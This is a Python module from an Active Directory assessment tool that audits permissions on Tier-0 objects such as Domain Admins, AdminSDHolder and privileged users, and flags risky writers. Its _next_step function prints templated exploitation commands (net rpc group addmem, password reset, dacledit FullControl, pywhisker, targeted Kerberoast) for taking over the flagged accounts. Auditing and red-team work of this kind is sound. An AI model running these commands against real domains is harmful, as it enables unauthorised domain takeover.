"""
Tier-0 ACL audit.

Brief §4.6 — broader than the Shadow Credentials module's
adminCount=1-only slice. Walks DACLs on every Tier-0-adjacent object
and flags non-default principals with dangerous rights:

  Targets audited:
    - AdminSDHolder                              (CN=AdminSDHolder,CN=System,...)
    - Domain Admins                              (RID 512)
    - Enterprise Admins                          (RID 519)
    - Schema Admins                              (RID 518)
    - Account Operators                          (S-1-5-32-548)
    - Backup Operators                           (S-1-5-32-551)
    - Server Operators                           (S-1-5-32-549)
    - krbtgt                                     (RID 502)
    - Every adminCount=1 enabled user object

  Dangerous rights flagged:
    GenericAll        (full takeover)
    GenericWrite      (modify any property — incl. password reset on user)
    WriteDACL         (rewrite the ACL → grant self anything)
    WriteOwner        (take ownership → re-DACL)
    WriteProperty(member)    (add yourself to a group)
    Self-write        (add yourself to a group via Self ACE)

The CRTE mindset this lights up: "helpdesk_op has WriteProperty(member)
on TierTwoSupportGroup, which is nested 3 levels deep into Domain
Admins" — both halves matter, and recursive group resolution
(``ldap_helpers.is_member_of``) tells us when a "writer" is actually
already-privileged so we don't spam findings for in-tier accounts that
already hold the rights legitimately.

Each finding emits a ``KerbMapWriteAcl`` BloodHound CE custom edge so
operators can ``MATCH (u)-[:KerbMapWriteAcl]->(t {samaccountname:
'Domain Admins'}) RETURN u`` to recover the ACL graph in BH directly.

Reference:
- BloodHound's standard ACL edges (GenericAll / GenericWrite / WriteDACL
  / WriteOwner / WriteSPN / AddSelf / etc.) are the inspiration; this
  module produces the kerb-map-friendly subset plus the membership
  primitive (WriteProperty(member) / Self).
"""

from __future__ import annotations

from kerb_map.acl import (
    ADS_RIGHT_DS_CONTROL_ACCESS,
    ADS_RIGHT_DS_SELF,
    ADS_RIGHT_GENERIC_ALL,
    ADS_RIGHT_GENERIC_WRITE,
    ADS_RIGHT_WRITE_DAC,
    ADS_RIGHT_WRITE_OWNER,
    ATTR_MEMBER,
    is_well_known_privileged,
    parse_sd,
    resolve_sids,
    sd_control,
    walk_aces,
)
from kerb_map.ldap_helpers import attr, is_member_of
from kerb_map.plugin import Finding, Module, ScanContext, ScanResult, register

# ────────────────────────────────────────────────────────────────────── #
#  Targets we audit                                                      #
# ────────────────────────────────────────────────────────────────────── #


# Builtin / well-known privileged groups (full SIDs).
WELL_KNOWN_PRIVILEGED_GROUPS = (
    ("S-1-5-32-544", "BUILTIN\\Administrators"),
    ("S-1-5-32-548", "BUILTIN\\Account Operators"),
    ("S-1-5-32-549", "BUILTIN\\Server Operators"),
    ("S-1-5-32-551", "BUILTIN\\Backup Operators"),
    ("S-1-5-32-550", "BUILTIN\\Print Operators"),
)

# Domain-relative privileged group RIDs. Resolved against ctx.domain_sid
# at scan time so we get the actual S-1-5-21-... SID.
DOMAIN_PRIVILEGED_RIDS = (
    (512, "Domain Admins"),
    (519, "Enterprise Admins"),
    (518, "Schema Admins"),
    (520, "Group Policy Creator Owners"),
    (526, "Key Admins"),
    (527, "Enterprise Key Admins"),
)


# ────────────────────────────────────────────────────────────────────── #
#  Finding bands                                                          #
# ────────────────────────────────────────────────────────────────────── #


# Per-right severity bucketing. The "right" here is the most dangerous
# bit observed on the ACE. Order matters — first match wins, so list
# the loudest rights first.
RIGHT_SEVERITY: list[tuple[str, int, str, int]] = [
    # (label,            mask,                              severity,   priority)
    ("GenericAll",       ADS_RIGHT_GENERIC_ALL,             "CRITICAL", 95),
    ("WriteDACL",        ADS_RIGHT_WRITE_DAC,               "CRITICAL", 93),
    ("WriteOwner",       ADS_RIGHT_WRITE_OWNER,             "CRITICAL", 92),
    ("GenericWrite",     ADS_RIGHT_GENERIC_WRITE,           "HIGH",     85),
    # WriteProperty(member) and Self need extra inspection per ACE
    # (they're property-scoped) — handled below in _classify_ace.
    ("ControlAccess",    ADS_RIGHT_DS_CONTROL_ACCESS,       "HIGH",     78),
]


@register
class Tier0AclAudit(Module):
    name = "Tier-0 ACL audit"
    flag = "tier0-acl"
    description = "Walk DACLs on Tier-0 objects (AdminSDHolder, DA/EA/SA, adminCount=1) for dangerous non-default writers"
    category = "attack-path"
    in_default_run = True

    # ------------------------------------------------------------------ #
    #  Entry                                                              #
    # ------------------------------------------------------------------ #

    def scan(self, ctx: ScanContext) -> ScanResult:
        targets = self._enumerate_targets(ctx)
        if not targets:
            return ScanResult(raw={
                "applicable": False,
                "reason":     "no Tier-0 objects enumerated",
            })

        # Build the set of "already-privileged" SIDs so we don't flag
        # in-tier writers (Domain Admins ≅ AdminSDHolder writers ≅ noise).
        privileged_dns = self._resolve_privileged_group_dns(ctx, targets)

        deferred:    list[tuple[dict, dict]] = []   # (target_info, ace_match)
        all_writer_sids: set[str] = set()

        for tgt in targets:
            sd = parse_sd(tgt.get("nTSecurityDescriptor"))
            if sd is None:
                continue
            for ace in walk_aces(sd, object_dn=tgt["dn"]):
                classification = _classify_ace(ace)
                if classification is None:
                    continue
                if is_well_known_privileged(ace.trustee_sid):
                    continue  # Domain Admins / DCs / etc. — by design
                deferred.append((tgt, {"ace": ace, "class": classification}))
                all_writer_sids.add(ace.trustee_sid)

        if not deferred:
            return ScanResult(raw={
                "applicable":  True,
                "audited":     [t["sam"] for t in targets],
                "summary":     {"audited": len(targets), "findings": 0},
            })

        # Resolve every writer SID in one batch — expensive part, do it once.
        names = resolve_sids(ctx.ldap, all_writer_sids, ctx.base_dn)

        # Pre-compute "is this writer effectively privileged via nested
        # groups?" so we can suppress in-tier findings. Saves the
        # operator ~200 noise findings on a big estate.
        writer_already_privileged = self._classify_writers(
            ctx, names, privileged_dns,
        )

        findings:    list[Finding] = []
        raw_entries: list[dict]    = []
        for tgt, match in deferred:
            ace          = match["ace"]
            classified   = match["class"]
            writer_sid   = ace.trustee_sid
            writer_info  = names.get(writer_sid, {})
            writer_sam   = writer_info.get("sAMAccountName") or writer_sid
            writer_dn    = writer_info.get("distinguishedName") or ""

            if writer_already_privileged.get(writer_sid):
                # Effectively in tier-0 already — not an attack edge,
                # don't pollute the findings list.
                raw_entries.append({
                    "target":      tgt["sam"],
                    "target_dn":   tgt["dn"],
                    "writer_sid":  writer_sid,
                    "writer_sam":  writer_sam,
                    "right":       classified["label"],
                    "in_tier":     True,
                })
                continue

            severity = classified["severity"]
            priority = classified["priority"]

            findings.append(Finding(
                target=tgt["sam"],
                attack=f"Tier-0 ACL: {classified['label']} on {tgt['kind']}",
                severity=severity,
                priority=priority,
                reason=(
                    f"{writer_sam} has {classified['label']} on "
                    f"{tgt['sam']} ({tgt['kind']}) — non-default principal, "
                    f"not in any tier-0 group transitively. Compromise of "
                    f"{writer_sam} = takeover of {tgt['sam']}."
                ),
                next_step=_next_step(classified["label"], writer_sam, tgt, ctx),
                category="attack-path",
                mitre="T1078.002",   # Domain Accounts (privilege escalation)
                data={
                    "writer_sid":  writer_sid,
                    "writer_sam":  writer_sam,
                    "writer_dn":   writer_dn,
                    "target_dn":   tgt["dn"],
                    "target_sid":  tgt.get("sid"),
                    "target_kind": tgt["kind"],
                    "right":       classified["label"],
                    "domain_sid":  ctx.domain_sid,
                },
            ))
            raw_entries.append({
                "target":      tgt["sam"],
                "target_dn":   tgt["dn"],
                "writer_sid":  writer_sid,
                "writer_sam":  writer_sam,
                "right":       classified["label"],
                "in_tier":     False,
            })

        return ScanResult(
            raw={
                "applicable":  True,
                "audited":     [t["sam"] for t in targets],
                "entries":     raw_entries,
                "summary": {
                    "audited":               len(targets),
                    "findings":              len(findings),
                    "in_tier_writers_count": sum(1 for r in raw_entries if r["in_tier"]),
                },
            },
            findings=findings,
        )

    # ------------------------------------------------------------------ #
    #  Target enumeration                                                #
    # ------------------------------------------------------------------ #

    def _enumerate_targets(self, ctx: ScanContext) -> list[dict]:
        """Build the list of Tier-0 objects to audit. Each entry:
        {sam, dn, sid, kind, nTSecurityDescriptor}."""
        out: list[dict] = []

        # 1. AdminSDHolder
        admin_sd = ctx.ldap.query(
            search_filter="(cn=AdminSDHolder)",
            attributes=["sAMAccountName", "distinguishedName", "objectSid",
                        "nTSecurityDescriptor"],
            search_base=f"CN=System,{ctx.base_dn}",
            controls=sd_control(),
        )
        for e in admin_sd:
            out.append({
                "sam":   "AdminSDHolder",
                "dn":    attr(e, "distinguishedName"),
                "sid":   None,
                "kind":  "AdminSDHolder",
                "nTSecurityDescriptor": attr(e, "nTSecurityDescriptor"),
            })

        # 2. Builtin privileged groups (one query, OR-filter)
        builtin_filters = "".join(
            f"(objectSid={_sid_to_ldap_filter(s)})"
            for s, _ in WELL_KNOWN_PRIVILEGED_GROUPS
        )
        builtin = ctx.ldap.query(
            search_filter=f"(|{builtin_filters})",
            attributes=["sAMAccountName", "distinguishedName", "objectSid",
                        "nTSecurityDescriptor"],
            controls=sd_control(),
        )
        builtin_label = dict(WELL_KNOWN_PRIVILEGED_GROUPS)
        for e in builtin:
            from kerb_map.ldap_helpers import sid_to_str
            sid_str = sid_to_str(attr(e, "objectSid"))
            out.append({
                "sam":   builtin_label.get(sid_str, attr(e, "sAMAccountName") or "?"),
                "dn":    attr(e, "distinguishedName"),
                "sid":   sid_str,
                "kind":  "Builtin privileged group",
                "nTSecurityDescriptor": attr(e, "nTSecurityDescriptor"),
            })

        # 3. Domain-relative privileged groups (DA/EA/SA/etc.)
        if ctx.domain_sid:
            domain_filters = "".join(
                f"(objectSid={_sid_to_ldap_filter(f'{ctx.domain_sid}-{rid}')})"
                for rid, _ in DOMAIN_PRIVILEGED_RIDS
            )
            domain_groups = ctx.ldap.query(
                search_filter=f"(|{domain_filters})",
                attributes=["sAMAccountName", "distinguishedName", "objectSid",
                            "nTSecurityDescriptor"],
                controls=sd_control(),
            )
            domain_label = {
                f"{ctx.domain_sid}-{rid}": label
                for rid, label in DOMAIN_PRIVILEGED_RIDS
            }
            from kerb_map.ldap_helpers import sid_to_str
            for e in domain_groups:
                sid_str = sid_to_str(attr(e, "objectSid"))
                out.append({
                    "sam":   domain_label.get(sid_str, attr(e, "sAMAccountName") or "?"),
                    "dn":    attr(e, "distinguishedName"),
                    "sid":   sid_str,
                    "kind":  "Privileged group",
                    "nTSecurityDescriptor": attr(e, "nTSecurityDescriptor"),
                })

        # 4. Every adminCount=1 enabled user
        priv_users = ctx.ldap.query(
            search_filter="(&(objectClass=user)(adminCount=1)"
                          "(!(userAccountControl:1.2.840.113556.1.4.803:=2))"
                          "(!(objectClass=computer)))",
            attributes=["sAMAccountName", "distinguishedName", "objectSid",
                        "nTSecurityDescriptor"],
            controls=sd_control(),
        )
        from kerb_map.ldap_helpers import sid_to_str
        for e in priv_users:
            out.append({
                "sam":   attr(e, "sAMAccountName") or "?",
                "dn":    attr(e, "distinguishedName"),
                "sid":   sid_to_str(attr(e, "objectSid")),
                "kind":  "Privileged user (adminCount=1)",
                "nTSecurityDescriptor": attr(e, "nTSecurityDescriptor"),
            })

        return out

    # ------------------------------------------------------------------ #
    #  In-tier suppression                                                #
    # ------------------------------------------------------------------ #

    def _resolve_privileged_group_dns(self, ctx: ScanContext, targets: list[dict]) -> list[str]:
        """Pull DNs of the canonical Tier-0 groups so we can ask
        ``is_member_of(writer, group)`` for each writer. We use the
        targets we already enumerated so it's free."""
        dns: list[str] = []
        for t in targets:
            if t["kind"] in ("Privileged group", "Builtin privileged group"):
                if t["dn"]:
                    dns.append(t["dn"])
        return dns

    def _classify_writers(
        self,
        ctx:                ScanContext,
        names:              dict[str, dict],
        privileged_groups:  list[str],
    ) -> dict[str, bool]:
        """For each writer SID, determine whether they're effectively
        privileged via nested-group membership in any tier-0 group.
        Suppresses noise from in-tier writers (Domain Admins members
        having GenericAll on AdminSDHolder is by design, not a finding).

        Uses recursive group resolution (``is_member_of`` →
        matching-rule-in-chain) — server-side walk, one query per
        (writer, group) pair. For an estate with N writers and K
        privileged groups, that's N×K queries — bounded since K is
        ~5-10, and the typical writer count is <50.
        """
        out: dict[str, bool] = {}
        for sid, info in names.items():
            writer_dn = info.get("distinguishedName") or ""
            if not writer_dn:
                out[sid] = False
                continue
            in_tier = any(
                is_member_of(ctx.ldap, writer_dn, gdn)
                for gdn in privileged_groups
            )
            out[sid] = in_tier
        return out


# ────────────────────────────────────────────────────────────────────── #
#  ACE classification                                                    #
# ────────────────────────────────────────────────────────────────────── #


def _classify_ace(ace) -> dict | None:
    """Map an ACE to {label, severity, priority} if it's dangerous;
    return None otherwise. WriteProperty(member) and Self are scoped
    to the member attribute specifically (the AddSelf primitive)."""
    # GenericAll / WriteDACL / WriteOwner / GenericWrite first — they're
    # whole-object rights that subsume the property-scoped ones below.
    for label, mask, severity, priority in RIGHT_SEVERITY:
        if mask == ADS_RIGHT_DS_CONTROL_ACCESS:
            continue   # handled separately — needs object-type check
        if ace.has_right(mask):
            return {"label": label, "severity": severity, "priority": priority}

    # WriteProperty(member) — add yourself to a group, the AddMember edge.
    if ace.has_write_property(ATTR_MEMBER):
        return {"label": "WriteProperty(member)", "severity": "HIGH", "priority": 88}

    # Self ACE on the member attribute — the AddSelf primitive.
    if ace.has_right(ADS_RIGHT_DS_SELF):
        # Self is meaningful only when scoped to the member attribute;
        # other Self-uses (passwordReset etc.) are different attack paths.
        if ace.object_type_guid is None or ace.object_type_guid.lower() == ATTR_MEMBER.lower():
            return {"label": "Self (AddSelf)", "severity": "HIGH", "priority": 86}

    return None


# ────────────────────────────────────────────────────────────────────── #
#  Per-right exploitation recipes                                        #
# ────────────────────────────────────────────────────────────────────── #


def _next_step(right: str, writer_sam: str, tgt: dict, ctx: ScanContext) -> str:
    """Render the right-specific recipe an operator would actually run.
    Templated with the writer + target so kerb-chain doesn't need to
    do extra substitution."""
    domain   = ctx.domain
    target   = tgt["sam"]
    target_dn = tgt["dn"]

    if right in ("GenericAll", "WriteDACL", "WriteOwner"):
        if "group" in tgt["kind"].lower():
            return (
                f"# Add yourself to {target} (full takeover via {right}):\n"
                f"net rpc group addmem '{target}' {writer_sam} "
                f"-U '{domain}\\{writer_sam}%<pass>' -S {ctx.dc_ip}\n"
                f"# OR via impacket:\n"
                f"dacledit.py -action write -rights FullControl "
                f"-principal {writer_sam} -target-dn '{target_dn}' "
                f"{domain}/<op_user>:<pass>"
            )
        return (
            f"# As {writer_sam} ({right} on {target}):\n"
            f"# Reset {target}'s password:\n"
            f"net rpc password '{target}' '<new_pass>' "
            f"-U '{domain}\\{writer_sam}%<pass>' -S {ctx.dc_ip}\n"
            f"# OR force PKINIT via Shadow Credentials chain (cleaner):\n"
            f"pywhisker.py -d {domain} -u {writer_sam} -p <pass> "
            f"--target {target} --action add"
        )

    if right == "GenericWrite":
        return (
            f"# As {writer_sam} (GenericWrite on {target}):\n"
            f"# Modify any property — e.g. servicePrincipalName for "
            f"targeted Kerberoast (force RC4):\n"
            f"targetedKerberoast.py -v -d {domain} -u {writer_sam} -p <pass>\n"
            f"# OR force constrained delegation via msDS-AllowedToDelegateTo"
        )

    if right == "WriteProperty(member)":
        return (
            f"# Add yourself to {target} group via member-write primitive:\n"
            f"net rpc group addmem '{target}' {writer_sam} "
            f"-U '{domain}\\{writer_sam}%<pass>' -S {ctx.dc_ip}\n"
            f"# OR:\n"
            f"net group {target} {writer_sam} /add /domain"
        )

    if right == "Self (AddSelf)":
        return (
            f"# AddSelf — bypass member-write, walk straight in:\n"
            f"net rpc group addmem '{target}' {writer_sam} "
            f"-U '{domain}\\{writer_sam}%<pass>' -S {ctx.dc_ip}"
        )

    return f"# Investigate {right} on {target} via BloodHound."


# ────────────────────────────────────────────────────────────────────── #
#  Helpers                                                                #
# ────────────────────────────────────────────────────────────────────── #


def _sid_to_ldap_filter(sid: str) -> str:
    """Reuse the encoder from acl.py — keeps the LDAP-filter binary
    encoding in one place."""
    from kerb_map.acl import _sid_to_ldap_filter as _enc
    return _enc(sid)
